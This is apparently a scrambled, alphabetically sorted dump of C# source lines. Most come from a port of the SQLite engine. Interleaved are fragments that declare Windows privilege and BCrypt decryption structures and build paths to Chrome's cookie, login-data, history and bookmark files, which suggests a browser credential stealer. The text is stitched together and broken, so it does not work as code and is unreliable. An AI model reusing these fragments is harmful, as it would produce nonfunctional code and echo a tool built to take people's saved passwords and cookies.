            pItem = pSrcList.a[i]
            pItem.done = 1
            pItem.iAlias = 0
            pItem.iCol = (u16)iCol
            pKeyDup.aSortOrder[i] = 0
            pKeyMerge.aColl[i] = pColl
            pKeyMerge.aSortOrder[i] = (byte)pOrderBy.a[i].sortOrder
            pLItem = pExpr.x.pList.a[1]
            pLeft = pOrTerm.pExpr.pLeft
            pLimit = p.pLimit
            pList = pTrig
            pLoop.addrOpenEphm[i] = -1
            pLoop.pNext = pRight
            pLoop.pRightmost = p
            pMem.enc = SQLITE_UTF8
            pMem.flags = MEM_Int
            pMem.flags = MEM_Null
            pMem.flags = MEM_Str 
            pMem.n = (int)len
            pMem.n = 0
            pMem.n = pMem.z == null 
            pMem.type = SQLITE_NULL
            pMem.type = SQLITE_TEXT
            pMem.u.i = (i64)x
            pMem.u.i = (int)( ( ( (sbyte)buf[offset 
            pMem.u.i = (int)( ( ( buf[0] ) << 16 ) 
            pMem.u.i = (int)( ( ( buf[0] ) << 8 ) 
            pMem.u.i = (int)( ( (sbyte)buf[offset 
            pMem.u.i = (int)( ( buf[0] << 24 ) 
            pMem.u.i = (sbyte)buf[0]
            pMem.u.i = (sbyte)buf[offset 
            pMem.u.i = serial_type - 8
            pMem.xDel = null
            pMem.z = null
            pMem.z = pOp.zComment
            pMem.zBLOB = null
            pMove = null
            pNew = pTerm
            pNew = pWC.a[idxNew]
            pNew.flags 
            pNew.flags2 = 0
            pNew.iParent = idxTerm
            pNew.pColl = pExpr.pColl
            pNew.u.iValue = i
            pNew.u.iValue = iValue
            pNew.x.pList = pList
            pNext = p.pNext
            pNext = pPage.pNext
            pOffset = p.pOffset
            pOp.opcode = OP_Noop
            pOrTerm = pOrWC.a[_pOrWC]
            pOrTerm = pOrWc.a[pOrWc.nTerm - 1 - i]
            pOrTerm.eOperator = WO_AND
            pOrTerm.u.pAndInfo = pAndInfo
            pOrTerm.wtFlags 
            pOrTerm.wtFlags = (u8)( pOrTerm.wtFlags 
            pOrderBy.a[nOrderBy
            pOther = pOther.pNext
            pOut.p2 = addr 
            pOut.p2 = p2
            pPage.pNext = apNew[h]
            pPager.changeCountDone = true
            pPager.dbFileSize = pgno
            pPager.dbSize = nPage
            pPager.errCode = SQLITE_OK
            pPager.nRec
            pPager.pTmpSpace = new byte[pageSize]
            pPager.pageSize = pageSize
            pPager.state = PAGER_EXCLUSIVE
            pParse.apVarExpr = new Expr[pParse.nVarExprAlloc]
            pParse.apVarExpr[pParse.nVarExpr
            pParse.db.lookaside.bEnabled = 0
            pParse.nVarExprAlloc 
            pParse.trigStack = trigStackEntry.pNext
            pParse.zAuthContext = zSavedContext
            pPgno = iTrunk
            pPrior.pLimit = p.pLimit
            pPrior.pOffset = p.pOffset
            pRec.u.i = value
            pRes = 1
            pRight = pExpr.pRight
            pRight = pLItem.pExpr
            pRight = pLoop
            pRoot.flags 
            pRoot.pColl = pLeft.pColl
            pRoot.pColl = pRight.pColl
            pRowidExpr = pChanges.a[i].pExpr
            pSchema = pTab.pSchema
            pSel = pExpr.x.pSelect
            pSelTab.aCol = null
            pSelTab.nCol = 0
            pStmt = null
            pTab = pColExpr.pTab
            pTab = pItem.pTab
            pTab = pTriggerStack.pTab
            pTab.aCol[iCol].isPrimKey = 0
            pTab.pTrigger = pTrigger.pNext
            pTemp = null
            pTerm = pWC.a[idxTerm]
            pTerm.nChild = 1
            pTerm.wtFlags 
            pTrig.pNext = ( pList != null 
            pTrunk = null
            pWC.a[idxNew].iParent = idxTerm
            pager_reset( pPager )
            pcache1FreePage( ref  pPage )
            pcache1PinPage( pPage )
            piColMask = pTriggerStack.newColMask
            piColMask = pTriggerStack.oldColMask
            piMoved = (int)maxRootPgno
            pp = pPage.pNext
            ppPage = pTrunk
            prc = db.xProgress( db.pProgressArg )
            priorOp = SRT_Union
            privs.Privilege[0].Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED
            privs.Privilege[0].Luid = luid
            public BCRYPT_OAEP_PADDING_INFO(string alg)
            public Guid SchemaId
            public Int32 HighPart
            public IntPtr pAuthenticatorElement
            public IntPtr pIdentityElement
            public IntPtr pPackageSid
            public IntPtr pPropertyElements
            public IntPtr pResourceElement
            public IntPtr pbAuthData
            public IntPtr pbLabel
            public IntPtr pbMacContext
            public IntPtr pbNonce
            public IntPtr pbTag
            public IntPtr pszCredentialFriendlyName
            public LUID Luid
            public LUID_AND_ATTRIBUTES[] Privilege
            public LUID_AND_ATTRIBUTES[] Privileges
            public UInt32 Attributes
            public UInt32 LowPart
            public UInt32 dwFlags
            public UInt32 dwPropertiesCount
            public UInt64 LastModified
            public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002
            public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
            public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004
            public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000
            public int PrivilegeCount
            public int cbAAD
            public int cbAuthData
            public int cbLabel
            public int cbMacContext
            public int cbNonce
            public int cbSalt
            public int cbSize
            public int cbTag
            public int dwFlags
            public int dwIncrement
            public int dwInfoVersion
            public int dwMaxLength
            public int dwMinLength
            public long cbData
            public static uint PRIVILEGE_SET_ALL_NECESSARY = 1
            public string pszAlgId
            public uint Control
            public uint PrivilegeCount
            public void Dispose()
            r1 = (double)pMem1.u.i
            r1 = pMem1.r
            r1 = sqlite3GetTempReg( pParse )
            r2 = (double)pMem2.u.i
            r2 = pMem2.r
            r3 = sqlite3GetTempReg( pParse )
            r4 = sqlite3GetTempReg( pParse )
            rRounder = r < 0 
            rScale 
            rTotal 
            rc 
            rc = 0
            rc = ALWAYS( x )
            rc = SQLITE_CORRUPT_BKPT()
            rc = SQLITE_DONE
            rc = SQLITE_ERROR
            rc = SQLITE_IOERR
            rc = SQLITE_NOMEM
            rc = SQLITE_OK
            rc = SQLITE_READONLY
            rc = pPager.errCode
            rc = rc2
            rc = sqlite3BtreeCommitPhaseTwo( pBt )
            rc = sqlite3OsWrite(
            rc = sqlite3PagerWrite(pPg.pDbPage)
            rc = sqlite3PagerWrite(pTrunk.pDbPage)
            rc = sqlite3PendingByte
            rc = sqlite3VdbeFinalize( pStmt )
            rc = x
            regBase = r1
            regRecord = sqlite3GetTempReg( pParse )
            regRowid = 
            regRowset = 
            releasePage(pFreePg)
            releasePage(pMove)
            releasePage(pPage)
            releasePage(pPg)
            releasePage(pRoot)
            releasePage(pToRelease)
            res = 1
            retries--
            return
            return (byte[])ap[vaNEXT - 1]
            return (char)'0'
            return (int[])ap[vaNEXT - 1]
            return -i - 1
            return 0
            return 1
            return 1 
            return 2
            return 3
            return 4
            return 6
            return 8
            return Convert.ToUInt32( ap[vaNEXT - 1] )
            return Convert.ToUInt64( ap[vaNEXT - 1] )
            return Convert.ToUInt64( ap[vaNEXT - 1].GetHashCode() )
            return SQLITE_CORRUPT_BKPT()
            return SQLITE_ERROR
            return SQLITE_IOERR_NOMEM
            return SQLITE_NOMEM
            return SQLITE_OK
            return WRC_Abort
            return WRC_Prune
            return ap[vaNEXT - 1].GetHashCode()
            return db
            return false
            return hAlg
            return i
            return i 
            return keyDataBuffer
            return len
            return len < zString.Length
            return list
            return null
            return plainText
            return rc
            return result
            return resultType
            return ret
            return table
            return table.Columns.Count
            return text1
            return true
            return value
            sAggInfo.useSortingIdx = 1
            sNC.pNext = pNC
            sNC.pParse = pNC.pParse
            sNC.pSrcList = pS.pSrc
            sbZ.Append( quote )
            searchList = 0
            searchList = 1
            slot[0]            slot[1]               slot[2]
            sqlite3 db = pParse.db
            sqlite3BtreeCommitPhaseTwo( pBt )
            sqlite3BtreeLeave(p)
            sqlite3CloseSavepoints( db )
            sqlite3DeleteTable( ref pSelTab )
            sqlite3EndBenignMalloc()
            sqlite3ErrorClear( pParse )
            sqlite3ExprCacheClear( pParse )
            sqlite3ExprCachePush( pParse )
            sqlite3GlobalConfig.m = ap
            sqlite3GlobalConfig.pcache = ap
            sqlite3MallocAlarm( nNew - nOld )
            sqlite3OpenTempDatabase( pParse )
            sqlite3PagerUnref( pPage )
            sqlite3PcacheMakeClean( p )
            sqlite3PrngResetState()
            sqlite3PrngRestoreState()
            sqlite3PrngSaveState()
            sqlite3RollbackAll( db )
            sqlite3SafetyOff( db )
            sqlite3SrcListShiftJoinType(yygotominor.yy65)
            sqlite3VdbeMemRealify( pRec )
            sqlite3VdbeMemRelease( c1 )
            sqlite3VdbeMemRelease( c2 )
            sqlite3VdbeMemRelease( pEnd )
            sqlite3VdbePrintSql( p )
            sqlite3WhereEnd( pWInfo )
            sqlite3_file pFile = sqlite3PagerFile( pDestPager )
            sqlite3_interrupt( db )
            sqlite3_pager_writej_count.iValue = iValue
            sqlite3_query_plan.Append( pLevel.plan.u.pIdx.zName )
            sqlite3_query_plan.Append( z )
            sqlite3_result_null( context )
            statement.Close()
            string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites)
            string chrome_History_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) 
            string chrome_book_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) 
            string chrome_cookie_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) 
            string login_data_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) 
            string text1 = null
            string z
            string z1
            string z2
            string zArg = sqlite3_value_text( argv[0] )
            string zAs = pEList.a[j].zName
            string zColumn
            string zDb
            string zDb = db.aDb[i].zName
            string zFile = sqlite3BtreeGetJournalname( pBt )
            string zId
            string zName
            string zName = pLeftTab.aCol[j].zName
            string zName = pList.a[j].zName
            string zNewName
            string zSavedContext = pParse.zAuthContext
            string zSpan = pList.a[i].zSpan
            string zTName
            string zTable
            string zToken
            string[] urls = new string[26]
            switch ( (char)zFmt[i 
            switch ( (char)zFmt[i] )
            sz = 4 
            tab1 = pParse.nTab
            tab2 = pParse.nTab
            table.Rows.Add( columnValues )
            testOp = bRev != 0 
            testcase( db.flags 
            testcase( delim == '
            testcase( eDest == SRT_Coroutine )
            testcase( eDest == SRT_EphemTab )
            testcase( eDest == SRT_Output )
            testcase( eDest == SRT_Table )
            testcase( idxNew == 0 )
            testcase( jumpIfNull == 0 )
            testcase( op == TK_AND )
            testcase( op == TK_BITAND )
            testcase( op == TK_BITNOT )
            testcase( op == TK_BITOR )
            testcase( op == TK_CONCAT )
            testcase( op == TK_CONST_FUNC )
            testcase( op == TK_EQ )
            testcase( op == TK_EXISTS )
            testcase( op == TK_FUNCTION )
            testcase( op == TK_GE )
            testcase( op == TK_GT )
            testcase( op == TK_ISNULL )
            testcase( op == TK_LE )
            testcase( op == TK_LSHIFT )
            testcase( op == TK_LT )
            testcase( op == TK_MINUS )
            testcase( op == TK_NE )
            testcase( op == TK_NOT )
            testcase( op == TK_NOTNULL )
            testcase( op == TK_OR )
            testcase( op == TK_PLUS )
            testcase( op == TK_REM )
            testcase( op == TK_RSHIFT )
            testcase( op == TK_SELECT )
            testcase( op == TK_SLASH )
            testcase( p.op == TK_BLOB )
            testcase( p.op == TK_EXCEPT )
            testcase( p.op == TK_FLOAT )
            testcase( p.op == TK_INTEGER )
            testcase( p.op == TK_NULL )
            testcase( p.op == TK_STRING )
            testcase( p.op == TK_UNION )
            testcase( p.op == TK_VARIABLE )
            testcase( pDest.eDest == SRT_EphemTab )
            testcase( pDest.eDest == SRT_Table )
            testcase( pExpr.op == TK_AGG_COLUMN )
            testcase( pExpr.op == TK_COLUMN )
            testcase( pExpr.op == TK_CONST_FUNC )
            testcase( pExpr.op == TK_EXISTS )
            testcase( pExpr.op == TK_IN )
            testcase( pExpr.op == TK_SELECT )
            testcase( rc != SQLITE_OK )
            testcase( rc == SQLITE_NOMEM )
            testcase( regFree1 == 0 )
            testcase( regFree2 == 0 )
            testcase( to_op == OP_ToBlob )
            testcase( to_op == OP_ToInt )
            testcase( to_op == OP_ToNumeric )
            testcase( to_op == OP_ToReal )
            testcase( to_op == OP_ToText )
            testcase( z[0] == '
            testcase( z[0] == ' ' )
            testcase( z[0] == '$' )
            testcase( z[0] == '0' )
            testcase( z[0] == '3' )
            testcase( z[0] == '6' )
            testcase( z[0] == '9' )
            testcase( z[0] == 'x' )
            testcase(iPage == mxPage)
            testcase(pc 
            testcase(pc == iCellFirst)
            testcase(pc == iCellLast)
            testcase(x == 3)
            testcase(x == 4)
            to_op = aff - SQLITE_AFF_TEXT 
            tokenType = TK_BITAND
            tokenType = TK_BITNOT
            tokenType = TK_COMMA
            tokenType = TK_EQ
            tokenType = TK_INTEGER
            tokenType = TK_LP
            tokenType = TK_MINUS
            tokenType = TK_PLUS
            tokenType = TK_REM
            tokenType = TK_RP
            tokenType = TK_SEMI
            tokenType = TK_SPACE
            tokenType = TK_STAR
            tokenType = TK_VARIABLE
            tokenType = c == ']' 
            tp.Privileges[0] = luAttr
            try
            u32 cksum
            u32 closest
            u32 h = (u32)( pPage.iKey % nNew )
            u32 h = BITVEC_HASH( aiValues[j] - 1 )
            u32 iSize = (u32)nSrcPagesize 
            u32 len = ( serial_type - 12 ) / 2
            u32 y
            u32 y = (u32)( ( buf[2] << 24 ) 
            u32 y = (u32)( ( buf[offset 
            u32[] pTemp = new u32[pPager.pTmpSpace.Length]
            u64 t2 = t1
            u64 x
            u64 x = (ulong)( ( ( (sbyte)buf[offset 
            u64 x = (ulong)( ( ( buf[0] ) << 8 ) 
            u8 eType = (u8)(pgnoPtrmap != 0 
            u8 enc = (u8)pParse.db.aDbStatic[0].pSchema.enc
            u8 enc = ENC( db )
            u8 op = 0
            u8[] aMagic = new u8[8]
            u8[] zBuf = pPgHdr.pData
            u8[] zHeader = new u8[aJournalMagic.Length 
            uniondest.eDest = op
            upr = idx - 1
            using (authInfo)
            v.zEnd = yymsp[0].minor.yy346.zEnd
            v.zErrMsg = zErr
            v.zStart = yymsp[-1].minor.yy0.z
            v1 
            v1 /= scale
            var OSMajor = OSVersion.Major
            var OSMinor = OSVersion.Minor
            var OSVersion = Environment.OSVersion.Version
            void_function xBenignBegin
            void_function xBenignEnd
            while ( ( precision-- ) > 0 )
            while ( c >= '0' 
            while ( cc != null )
            while ( iz < z.Length 
            while ( len < zString.Length 
            while ( p.u.aHash[h] != 0 )
            while ( pNC != null 
            while ( sqlite3Isspace( z[n] ) ) n
            while ( z.Length > iOffset 
            while ( z[zDx] == '0' )
            while (i == iNextOld)
            width = -width
            width = width 
            wsFlags 
            x = ( x << 32 ) 
            x = (u64)( ( buf[0] << 24 ) 
            x = (u64)( ( buf[offset 
            x=5
            x=5 AND y<10
            x=5 AND y=10
            x=5 AND y=5 AND z<=10
            x=5 AND y>5 AND y<10
            x=5 AND z<10
            y = (u32)( ( buf[4] << 24 ) 
            y = (u32)( ( buf[offset 
            yy_parse_failed(yypParser)
            yygotominor.yy0 = (yymsp[-6].minor.yy0.n == 0 
            yygotominor.yy0 = yymsp[0].minor.yy0
            yygotominor.yy0.n = (int)(yymsp[-2].minor.yy0.z.Length - pParse.sLastToken.z.Length) 
            yygotominor.yy0.n = yymsp[-3].minor.yy0.z.Length - yymsp[0].minor.yy0.z.Length 
            yygotominor.yy0.n = yymsp[-5].minor.yy0.z.Length - yymsp[0].minor.yy0.z.Length 
            yygotominor.yy0.n = yymsp[0].minor.yy0.n 
            yygotominor.yy0.z = yymsp[-1].minor.yy0.z
            yygotominor.yy3 = yymsp[0].minor.yy3
            yygotominor.yy346.zEnd = yymsp[-1].minor.yy346.zEnd
            yygotominor.yy346.zEnd = yymsp[0].minor.yy0.z != null 
            yygotominor.yy346.zEnd = yymsp[0].minor.yy0.z.Substring(yymsp[0].minor.yy0.n)
            yygotominor.yy346.zEnd = yymsp[0].minor.yy346.zEnd
            yygotominor.yy346.zStart = yymsp[-2].minor.yy0.z
            yygotominor.yy346.zStart = yymsp[-2].minor.yy346.zStart
            yygotominor.yy346.zStart = yymsp[-3].minor.yy0.z
            yygotominor.yy346.zStart = yymsp[-3].minor.yy346.zStart
            yygotominor.yy346.zStart = yymsp[-4].minor.yy0.z
            yygotominor.yy346.zStart = yymsp[-4].minor.yy346.zStart
            yygotominor.yy346.zStart = yymsp[-5].minor.yy0.z
            yygotominor.yy473 = yymsp[-1].minor.yy473
            yygotominor.yy473 = yymsp[-2].minor.yy473
            yygotominor.yy65 = yymsp[-1].minor.yy65
            yygotominor.yy65 = yymsp[0].minor.yy65
            yymsp[-1].minor.yy473.pLast = yymsp[-1].minor.yy473
            yymsp[-2].minor.yy473.pLast = yymsp[-1].minor.yy473
            yymsp[-2].minor.yy473.pLast.pNext = yymsp[-1].minor.yy473
            z = new StringBuilder( i 
            z = pExpr.u.zToken.Substring( 2 )
            z.Append( (char)zFmt[i] )
            z1 = pIdx.azColl[k]
            z2 = pIndex.azColl[k]
            zBuf.Append( '.' )
            zBuf.Append( (char)c )
            zCol = pTab.aCol[iCol].zName
            zColl = db.pDfltColl.zName
            zColl = p.pTab.aCol[j].zColl
            zConverted.Length = i
            zCsr 
            zDx
            zId = pExpr.u.zToken
            zIndex
            zName = zNewName
            zSep = sqlite3_value_text( argv[1] )
            zText = new StringBuilder( 2 
            zType[i-1] = '
            zType[j] = zType[j
            {
            {                     /
            {                  /
            {                 /
            {                /
            {               /
            {              /
            {             /
            {            /
            {           /
            {          /
            {         /
            {        /
            {       /
            {      /
            {     /
            {    /
            {   /
            {  /
            {// IdChar(z[iOffset
            {//IdChar(
            }
            } while (
           /
           //int (
           A natural cross join B
           aiRowEst[N]<=aiRowEst[N-1]
           aiRowEst[N]>=1
           already equal to or greater than the sum of nMax for all
           close cursors
           column = expr
           in1
           in1 in2
           in1 in2 out3
           in1 in3
           k: The total number of sibling pages
           load value into register R..R
           load values into registers R..R
           nMin for all other purgeable caches. 
           open a read cursor on the corresponding <table2> index
           open a write cursor on the <table> index
           out UInt32 ReturnLengthInBytes)
           rc == SQLITE_OK 
           the symbolic name assigned to an ATTACH-ed database.
           transfer all records from the read to the write cursors
           transfer values form intermediate table into <table>
           yield X
          $ => nothing 
          ( ( db.flags 
          ( ( flags 
          ( SQLITE_DONE == rc 
          ( SQLITE_OPEN_DELETEONCLOSE 
          ( SQLITE_OPEN_MAIN_JOURNAL )
          ( pOn != null 
          ( pPager.tempFile 
          ( tmask 
          (pPgno)
          )
          -------------  -----------------  --------------  -----------------
          ...
          /
          //
          //      
          //       
          //           
          //                               (int)( pSpan.zEnd.Length - pSpan.zStart.Length ) )
          //          freeTempSpace(pBt)
          //      if ( db.mallocFailed != 0 ) goto no_mem
          //    db.mallocFailed = 1
          //  //Debug.Assert( db.mallocFailed != 0 )
          //  break
          //  pEnd.zMalloc = 0
          //  pKeyInfo.aSortOrder = (unsigned char
          //  rc = SQLITE_NOMEM
          //  return
          //  return SQLITE_NOMEM
          //  sqlite3MallocAlarm(nBytes)
          //  sqlite3_result_error_nomem( context )
          //  v.rc = SQLITE_NOMEM
          // Copy the Data Locally
          // TODO -- Determine if the following Assert is needed under c
          // This loop is very short -- so only minor performance hit
          // if ( pNextZombie != null ) cp.pNextZombie=pNextZombie.Copy()
          // if ( pSchema != null ) cp.pSchema=pSchema.Copy()
          ////        db.mallocFailed = 1
          //Debug.Assert( 0 == db.mallocFailed )
          //Debug.Assert( p.db.mallocFailed != 0 )
          //Debug.Assert( pPrior < pPage.aData 
          //Debug.Assert( sizeof( v) == sizeof(pMem.r))
          //Debug.Assert(iSpace1 <= pBt.pageSize)
          //DeleteFileA( zConverted )
          //PgHdr pNew = sqlite3PageMalloc( pageSize )
          //TESTONLY( int rc2 )
          //TESTONLY( rc2 
          //Trigger
          //aSortOrder = pKeyInfo.aSortOrder
          //assert(  (((u8
          //db.mallocFailed = 1
          //else
          //else if ( pEnd.zMalloc != null )
          //for ( pp = 
          //free(zConverted)
          //i 
          //i = mem0.aScratchFree[--mem0.nScratchFree]
          //iSpace1 
          //if ( 0 == db.mallocFailed )
          //if ( db.mallocFailed != 0 )
          //if ( negFlag ) value = -value
          //if ( pCheck != null ) cp.pCheck = pCheck.Copy()
          //if ( pNew == null )
          //if ( pSrc == null )
          //if ( rc == SQLITE_NOMEM 
          //if ( z == 0 )
          //if (!zMaster)
          //if( aSortOrder ){
          //if( pNew==0 
          //int i
          //p = (void
          //p.aMem--
          //p.db.mallocFailed = 1
          //pBuf = (void
          //pColl[0].zName[nName] = 0
          //pOp
          //pOrTerm = pOrWc.a
          //pPage.pData = (void
          //pPage.pExtra = (void
          //pParse->zTail = 
          //pTemp = 
          //sqlite3_free( ref  azChar )
          //sqlite3_free( ref db )
          //sqlite3_free( ref p )
          //sqlite3_free( ref zPathname )
          //sqlite3_mutex_leave(mem0.mutex)
          //string zIn = 
          //string zOut = 
          //string zV
          //u8 
          //void 
          //yytestcase(yyruleno==0)
          //yytestcase(yyruleno==1)
          //yytestcase(yyruleno==10)
          //yytestcase(yyruleno==11)
          //yytestcase(yyruleno==12)
          //yytestcase(yyruleno==2)
          //yytestcase(yyruleno==20)
          //yytestcase(yyruleno==21)
          //yytestcase(yyruleno==25)
          //yytestcase(yyruleno==268)
          //yytestcase(yyruleno==269)
          //yytestcase(yyruleno==279)
          //yytestcase(yyruleno==280)
          //yytestcase(yyruleno==287)
          //yytestcase(yyruleno==3)
          //yytestcase(yyruleno==305)
          //yytestcase(yyruleno==306)
          //yytestcase(yyruleno==314)
          //yytestcase(yyruleno==315)
          //yytestcase(yyruleno==319)
          //yytestcase(yyruleno==320)
          //yytestcase(yyruleno==322)
          //yytestcase(yyruleno==326)
          //yytestcase(yyruleno==327)
          //yytestcase(yyruleno==328)
          //yytestcase(yyruleno==34)
          //yytestcase(yyruleno==35)
          //yytestcase(yyruleno==4)
          //yytestcase(yyruleno==44)
          //yytestcase(yyruleno==51)
          //yytestcase(yyruleno==52)
          //yytestcase(yyruleno==53)
          //yytestcase(yyruleno==54)
          //yytestcase(yyruleno==55)
          //yytestcase(yyruleno==56)
          //yytestcase(yyruleno==62)
          //yytestcase(yyruleno==89)
          //yytestcase(yyruleno==90)
          //yytestcase(yyruleno==91)
          //yytestcase(yyruleno==92)
          //z 
          //zExtra 
          //zPathname[0] = 0
          //z[n] = 0
          //{
          //}
          //}while(   (   ((rc = GetFileAttributesA(zConverted)) != INVALID_FILE_ATTRIBUTES)
          AggInfo cp = (AggInfo)MemberwiseClone()
          AuthContext sContext
          Bitmask b
          Bitmask m = pSrc.colUsed
          Btree pBt = db.aDb[i].pBt
          Btree pBt = pDb.pBt
          CollSeq cp = (CollSeq)MemberwiseClone()
          CollSeq pColl
          CollSeq pColl = null
          CollSeq pColl = pExpr.pColl
          CollSeq pDel = null
          Db pDb = db.aDb[iDb]
          Debug.Assert(
          Debug.Assert( ( f 
          Debug.Assert( ( f1 
          Debug.Assert( ( f2 
          Debug.Assert( ( m - 1 ) == toTheLeft )
          Debug.Assert( ( p.flags 
          Debug.Assert( ( pCost.plan.wsFlags 
          Debug.Assert( ( pOrTerm.wtFlags 
          Debug.Assert( ( pPager.state == PAGER_SHARED )
          Debug.Assert( ( pTerm.wtFlags 
          Debug.Assert( ( pVal.flags 
          Debug.Assert( -1 - pOp.p2 < p.nLabel )
          Debug.Assert( //( p[1] ) == pEnd 
          Debug.Assert( 0 == pItem.isPopulated )
          Debug.Assert( SQLITE_DEFAULT_PAGE_SIZE <= SQLITE_MAX_DEFAULT_PAGE_SIZE )
          Debug.Assert( TK_GE == TK_GT 
          Debug.Assert( TK_LE == TK_GT 
          Debug.Assert( TK_LT == TK_GT 
          Debug.Assert( action == OE_Restrict )
          Debug.Assert( bRev == 0 
          Debug.Assert( esc == 0 )
          Debug.Assert( fd != null )
          Debug.Assert( i == 0 )
          Debug.Assert( i == 1 
          Debug.Assert( iCol == -1 
          Debug.Assert( iDb < pParse.db.nDb )
          Debug.Assert( iIdxCur >= 0 )
          Debug.Assert( isOpen( pPager.jfd ) )
          Debug.Assert( j < pTabList.nSrc )
          Debug.Assert( len > 0 )
          Debug.Assert( nArg == 1 )
          Debug.Assert( nBuf >= 0 )
          Debug.Assert( nExtra >= nColl )
          Debug.Assert( nKey == elem.nKey )
          Debug.Assert( offset == ii 
          Debug.Assert( omitTable == 0 )
          Debug.Assert( p == pIndex )
          Debug.Assert( p == pOld )
          Debug.Assert( pBt != null )
          Debug.Assert( pDel == null 
          Debug.Assert( pE != null )
          Debug.Assert( pE.op != TK_DOT 
          Debug.Assert( pEList != null 
          Debug.Assert( pEnd != null )
          Debug.Assert( pEnd.leftCursor == iCur )
          Debug.Assert( pExpr.pLeft == null 
          Debug.Assert( pFrom.a[0].pOn == null )
          Debug.Assert( pFrom.a[0].pUsing == null )
          Debug.Assert( pFrom.nSrc == 1 )
          Debug.Assert( pFrom.pTab == null )
          Debug.Assert( pH.htsize > 0 )
          Debug.Assert( pIdx != null )
          Debug.Assert( pIdx.autoIndex != 0 )
          Debug.Assert( pIdx.nColumn == 1 )
          Debug.Assert( pIdx.onError != OE_None )
          Debug.Assert( pIdx.pSchema == pTab.pSchema )
          Debug.Assert( pIndex.onError != OE_None )
          Debug.Assert( pItem.iCol > 0 
          Debug.Assert( pIx.pSchema == pTab.pSchema )
          Debug.Assert( pLeft != null )
          Debug.Assert( pList != null )
          Debug.Assert( pMem.z != null )
          Debug.Assert( pOp.p2 <= p.nMem )
          Debug.Assert( pOp.p2 > 0 )
          Debug.Assert( pOrTerm.eOperator == 0 )
          Debug.Assert( pPager != null )
          Debug.Assert( pPager.dbSizeValid )
          Debug.Assert( pPager.journalMode == PAGER_JOURNALMODE_DELETE
          Debug.Assert( pPager.journalMode == PAGER_JOURNALMODE_MEMORY )
          Debug.Assert( pPager.journalOff == JOURNAL_HDR_SZ( pPager ) )
          Debug.Assert( pPager.needSync )
          Debug.Assert( pPager.readOnly )
          Debug.Assert( pPager.state <= PAGER_SHARED )
          Debug.Assert( pPager.state >= PAGER_EXCLUSIVE )
          Debug.Assert( pPager.useJournal != 0 )
          Debug.Assert( pParent != p )
          Debug.Assert( pParent == p )
          Debug.Assert( pParent.pGroupBy == null )
          Debug.Assert( pParent.pHaving == null )
          Debug.Assert( pParent.pOrderBy == null )
          Debug.Assert( pParse.nTab == 1 )
          Debug.Assert( pPg.pPager == pPager )
          Debug.Assert( pSel != null )
          Debug.Assert( pSelect == null 
          Debug.Assert( pSrcList.a[i].iCursor >= 0 
          Debug.Assert( pStart.leftCursor == iCur )
          Debug.Assert( pTab != null )
          Debug.Assert( pTabItem.pTab != null )
          Debug.Assert( pTable.aCol == null )
          Debug.Assert( pTerm != null )
          Debug.Assert( pTerm.eOperator == WO_OR )
          Debug.Assert( pTerm.pExpr != null )
          Debug.Assert( pTopNC != null )
          Debug.Assert( pTrigger.pSchema == pTab.pSchema 
          Debug.Assert( pX != null )
          Debug.Assert( rc != SQLITE_BUSY 
          Debug.Assert( rc != SQLITE_DONE )
          Debug.Assert( rc != SQLITE_IOERR_BLOCKED )
          Debug.Assert( rc == SQLITE_OK 
          Debug.Assert( rc == SQLITE_OK )
          Debug.Assert( rc2 == SQLITE_OK )
          Debug.Assert( sqlite3BtreeHoldsMutex( pBt ) )
          Debug.Assert( v != null )
          Debug.Assert( zColl != null )
          Debug.Assert(!yyendofinput)
          Debug.Assert(eType != PTRMAP_FREEPAGE)
          Debug.Assert(eType != PTRMAP_ROOTPAGE)
          Debug.Assert(i 
          Debug.Assert(i <= usableSize - 4)
          Debug.Assert(i > 0)
          Debug.Assert(iFreePg < iLastPg)
          Debug.Assert(iMeta == 0 
          Debug.Assert(iOvflSpace <= pBt.pageSize)
          Debug.Assert(j < nMaxCells)
          Debug.Assert(j <= usableSize - 4)
          Debug.Assert(j == 0 
          Debug.Assert(leafCorrection == 0 
          Debug.Assert(maxRootPgno != PENDING_BYTE_PAGE(pBt))
          Debug.Assert(nCell < nMaxCells)
          Debug.Assert(nearby > 0)
          Debug.Assert(pBt.autoVacuum 
          Debug.Assert(pBt.autoVacuum)
          Debug.Assert(pCur.aiIdx[ii] == pCur.apPage[ii].nCell)
          Debug.Assert(pCur.aiIdx[pCur.iPage] < pCur.apPage[pCur.iPage].nCell)
          Debug.Assert(pCur.apPage[pCur.iPage].nCell == 0)
          Debug.Assert(pCur.apPage[pCur.iPage].nCell > 0)
          Debug.Assert(pCur.eState == CURSOR_VALID)
          Debug.Assert(pCur.skipNext != SQLITE_OK)
          Debug.Assert(pPgno != PENDING_BYTE_PAGE(pBt))
          Debug.Assert(pSrc != null)
          Debug.Assert(pToRelease == null 
          Debug.Assert(sqlite3PagerIswriteable(pParent.pDbPage))
          Debug.Assert(sz <= pBt.pageSize / 4)
          Debug.Assert(yyact == YY_ERROR_ACTION)
          Debugger.Break()
          Expr cp = Copy_Minimal()
          Expr cp = new Expr()
          Expr pColExpr = p
          Expr pDup
          Expr pE = a[k].pExpr
          Expr pE = pFunc.pExpr
          Expr pE = pParse.apVarExpr[i]
          Expr pExpr
          Expr pExprA = pA.x.pList.a[i].pExpr
          Expr pExprB = pB.x.pList.a[i].pExpr
          Expr pLeft = null
          Expr pNew
          Expr pNewExpr
          Expr pX
          Expr pX = pEList.a[i].pExpr
          Expr whenExpr
          ExprList cp = (ExprList)MemberwiseClone()
          ExprList pDel = null
          ExprList pList = null
          ExprList pOrderBy
          ExprList_item pItem
          FKey cp = (FKey)MemberwiseClone()
          FileChunk pNew = new FileChunk()
          Gosub      2 A
          Goto       B                
          Hash cp = (Hash)MemberwiseClone()
          IdList cp = (IdList)MemberwiseClone()
          IdList pList = pRight.pUsing
          InLoop pIn
          Index cp = (Index)MemberwiseClone()
          Index p
          Index pIdx
          Index pIdx = pLevel.plan.u.pIdx
          Index pIndex
          Index pIx = pLevel.plan.u.pIdx
          Index pOther = pTab.pIndex
